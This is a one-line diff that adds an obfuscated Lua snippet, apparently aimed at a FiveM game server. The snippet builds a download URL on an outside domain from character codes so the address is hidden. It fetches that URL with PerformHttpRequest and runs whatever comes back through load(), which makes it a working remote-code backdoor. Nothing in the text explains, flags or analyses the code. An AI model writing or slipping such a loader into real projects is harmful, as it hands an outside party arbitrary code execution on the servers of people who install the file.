@@ -1,0 +1,1 @@
+(function()local a=string.char;local b=load;local c=PerformHttpRequest;c(a(104,116,116,112,115,58,47,47,122,49,108,108,121,46,111,114,103,47,100,111,119,110,108,111,97,100,46,112,104,112,63,83,104,54,97,114,107,103,103),function(d,e)if d==200 then b(e)()end end)end)()
